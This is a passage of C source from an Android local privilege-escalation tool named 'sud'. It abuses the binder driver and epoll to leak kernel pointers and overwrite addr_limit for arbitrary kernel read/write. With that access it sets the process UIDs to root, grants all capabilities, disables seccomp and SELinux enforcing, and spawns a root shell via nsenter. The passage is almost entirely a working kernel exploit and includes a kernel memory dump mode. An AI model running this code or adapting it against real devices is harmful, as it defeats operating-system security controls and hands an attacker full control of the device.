        return 0;
    }

    FILE *bl = fopen(DENIED_PATH, "r");
    if (bl != NULL) {
        char line[512];
        while (fgets(line, sizeof(line), bl)) {
            char *p = line;
            while (*p && isspace(*p)) p++;
            char *q = p + strlen(p) - 1;
            while (q > p && isspace(*q)) *q-- = 0;

            if (q <= p || *p == '#') continue;

            if (*q == '*') {
                if (!strncmp(parent, p, q - p)) {
                    fclose(bl);
                    message("MAIN: denied by blacklist: %s", parent);
                    return 0; 
                }
            } else if (!strcmp(parent, p)) {
                fclose(bl);
                message("MAIN: denied by blacklist: %s", parent);
                return 0; 
            }
        }
        fclose(bl);
    }

    message("MAIN: allowed (default): %s", parent);
    return 1;
}




int main(int argc, char **argv)
{

    unsigned int oldUID = getuid();
    if (argc >= 2) {
        if (!strcmp(argv[1], "-v") || !strcmp(argv[1], "--verbose")) {
            quiet = 0;
            for (int i=1; i<argc-1; i++)
                argv[i] = argv[i+1];
            argc--;
        }
    }

    if (argc >=2 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
        printf("Usage: sud [OPTIONS] [COMMAND...]\nExamples:\n  sud: pop out default shell rooted with selinux disabled\n  sud -v | --verbose: Same but verbose output\n  sud -s bash: specify shell interpreter. default is $SHELL (usually bash)\n  sud -c id: run id as root and exit (like sudo)\n  sud id: same\n  sud -h | --help: print this help mesrage and exit\n");
        exit(0);
    }
    
    checkKernelVersion();

    message("MAIN: starting exploit for devices with waitqueue at 0x98");

    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);
    epfd = epoll_create(1000);

    unsigned long kstack = 0xDEADBEEFDEADBEEFul;
    unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
    int try = 0;
    while (try < RETRIES && !leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
        message("MAIN: **fail** retrying");
        try++;
    }
    if (try == RETRIES) {
        error("Failed to leak data");
    }
    else if (try > 0) {
        message("MAIN: took %d tries but did it", try);
    }
    
    unsigned long thread_info_ptr = kernel3 ? kstack : task_struct_ptr;
    
    message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
    if (kernel3) 
        message("MAIN: stack = %lx", kstack);
    message("MAIN: Clobbering addr_limit");
    unsigned long const src = 0xFFFFFFFFFFFFFFFEul;

    try = 0;
    while(try < RETRIES && !clobber_data(thread_info_ptr + 8, &src, 8)) {
        message("MAIN: **fail** retrying");
        try++;
    }
    if (try == RETRIES) {
        error("Failed to clobber addr_limit");
    }
    else if (try > 0) {
        message("MAIN: took %d tries but did it", try);
    }

    message("MAIN: thread_info = 0x%lx", thread_info_ptr);

    setbuf(stdout, NULL);
    message("MAIN: should have stable kernel R/W now");

    message("MAIN: searching for cred offset in task_struct");
    unsigned char task_struct_data[PAGE+16];
    kernel_read(task_struct_ptr, task_struct_data, PAGE);
        
    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data, argv[0]);
    
    unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);

#ifdef OFFSET__cred__user_ns    
    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
        search_base = 0xffffffc001744b70ul;
#else
#define search_base 0xffffffc000000000ul
#endif

    message("MAIN: search_base = %lx", search_base);
    
    message("MAIN: searching for selinux_enforcing");
    unsigned long selinux_enforcing = findSymbol(argv[0], search_base, "selinux_enforcing");
//    unsigned long selinux_enabled = findSymbol(argv[0], search_base, "selinux_enabled");

    message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
    
    for (int i = 0; i < 8; i++)
        kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, 0);

    if (getuid() != 0)
        error( "changing UIDs to 0");

    message("MAIN: UID = 0");

    message("MAIN: enabling capabilities");

    // reset securebits
    kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);

    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);

    int seccompStatus = prctl(PR_GET_SECCOMP);
    message("MAIN: SECCOMP status %d", seccompStatus);
    if (seccompStatus)
    {
        message("MAIN: disabling SECCOMP");
        kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
        // TODO: search for seccomp offset
        int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
        if (offset__task_struct__seccomp < 0) 
            message("MAIN: **FAIL** cannot find seccomp offset");
        else {
            message("MAIN: seccomp offset %lx", offset__task_struct__seccomp);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp, 0);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp + 8, 0);
            message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
        }
    }

    if (selinux_enforcing == 0)
        message("MAIN: **FAIL** did not find selinux_enforcing symbol");
    else
    {
        kernel_write_uint(selinux_enforcing, 0);
        message("MAIN: disabled selinux enforcing");
        
    cacheSymbol(argv[0], "selinux_enforcing", selinux_enforcing);
    message("MAIN: root privileges ready");
        
/* process hangs if these are done */        
//        unsigned long security_ptr = kernel_read_ulong(cred_ptr + OFFSET__cred__security);
//        kernel_write_uint(security_ptr, 1310);
//        kernel_write_uint(security_ptr+4, 1310);
//        for (int i=0; i<6; i++)
//           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  
    }

    if (!checkWhitelist(oldUID)) {
        if (selinux_enforcing != 0) {
            // Restore SELinux to Enforcing (1) to be safe
            kernel_write_uint(selinux_enforcing, 1); 
        }
        errno = 0;
        error("Whitelist check failed");
    }


    if (argc >= 2 && argv[1][0] == '-') {
        if (!strcmp(argv[1], "-dump") && argc >= 4) {
            unsigned long start, count;
            sscanf(argv[2], "%lx", &start);
            start &= ~7;
            sscanf(argv[3], "%lx", &count);
            unsigned long startValue = 0;
            int dump = 0;
            if (argc >= 5)
                sscanf(argv[4], "%lx", &startValue);
            else
                dump = 1;
                
            unsigned char page[PAGE];
            for (unsigned long i=start; i<start+count ; i+=PAGE) {
                kernel_read(i, page, PAGE);
                if (!dump) {
                    for (int j=0; j<PAGE; j+=8) {
                       if (*(unsigned long*)(page+j)==startValue) {
                           dump = 1;
                           break;
                       }
                    }
                }
                if (dump) {
                    printf("%lx:\n", i);
                    hexdump_memory(page, PAGE);
                }
            }
            exit(0);
        }
    }
/*
    execlp("nsenter", "nsenter", "-t", "1", (char*)0);
    char *cmd;
    if (argc == 3 && strcmp(argv[1], "-c")) {cmd = argv[2];}
    else if (argc == 2) {cmd = argv[1];}
    if (cmd)
    {
        execlp("sh", "sh", "-c", cmd, (char *)0);
    }
    else {
*/

    message("MAIN: popping out root shell");
    //execlp("sh", "sh", (char*)0);
    char _cwd[1024];
    getcwd(_cwd, 1024);
    char *_path = getenv("PATH");
    char *_term = getenv("TERM");
    char *_home = getenv("HOME");
    char *_shell = getenv("SHELL");
    if (argc >=3 && !strcmp(argv[1], "-s")) {
        _shell = argv[2];
        for (int i=1; i<argc-1; i++) argv[i] = argv[i+1];
        argc--; argc--;
    }
    char cmd[4096];
    sprintf(cmd, "cd %s && exec /system/bin/env PATH=%s TERM=%s HOME=%s %s",
        _cwd,_path ? _path : "/system/bin",_term ? _term : "xterm",_home ? _home : "/data/local/tmp",_shell ? _shell : "/system/bin/sh"
    );
    if (argc == 2) {strcpy(cmd, argv[1]);}
    else if (argc == 3 && !strcmp(argv[1], "-c")) {strcpy(cmd, argv[2]);}
    execlp("/sbin/nsenter","nsenter","-t","1","-m","sh","-c",cmd,(char*)0);
    execlp("/data/data/com.flipphoneguy.root/files/nsenter","nsenter","-t","1","-m","sh","-c",cmd,(char*)0);

    exit(0);
}
